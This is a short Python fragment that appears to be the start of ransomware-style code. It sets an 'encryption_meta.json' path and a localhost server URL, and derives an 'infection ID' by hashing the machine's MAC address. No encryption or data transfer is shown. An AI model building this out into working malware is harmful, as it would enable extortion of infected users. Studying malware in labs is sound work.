import uuid
import hashlib

META_PATH = "encryption_meta.json"
SERVER_URL = "http://localhost:80"

def get_infection_id():
    mac = uuid.getnode()
    return hashlib.sha256(str(mac).encode()).hexdigest()[:16]
